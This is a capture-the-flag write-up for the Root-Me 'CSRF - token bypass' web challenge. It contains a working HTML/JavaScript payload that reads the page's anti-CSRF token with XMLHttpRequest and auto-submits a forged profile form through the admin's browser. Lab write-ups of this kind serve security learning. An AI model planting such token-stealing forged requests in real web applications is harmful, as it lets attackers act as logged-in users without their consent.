## Challenge name: CSRF - token bypass

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)

**Similar to CSRF 0 protection, but the form has a CSRF token that changes with each request.**

**Use XMLHttpRequest to first fetch the token, then submit the form:**
```html
<form id="attack" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="your_username">
<input type="checkbox" name="status" checked>
<input id="token" type="hidden" name="token" value=""/>
</form>
<script>
var req = new XMLHttpRequest();
req.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
req.send();
var token = req.responseText.match(/[abcdef0123456789]{32}/);
document.getElementById("token").value = token;
document.getElementById("attack").submit();
</script>
```

**Submit this HTML in the Contact form. The admin's browser will fetch the token and submit the form, enabling your status.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
